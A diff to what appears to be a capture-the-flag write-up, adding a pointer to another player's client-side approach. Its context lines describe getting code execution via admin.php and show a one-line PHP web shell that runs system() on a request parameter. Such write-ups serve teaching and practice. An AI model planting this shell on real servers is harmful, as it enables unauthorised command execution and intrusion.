@@ -44,7 +44,7 @@ From here you go to `admin.php` and obtaining RCE is as simple as pointing the `
 system($_REQUEST['cmd']);
 ```
 
-Please note that if you are good with javascript, you can probably let the admin bot do the job for you.
+Please note that if you are good with javascript, you can probably let the admin bot do the job for you (see AkewakBiru writeup for a possible client side approach).
 
 ## rgiskard credentials
 
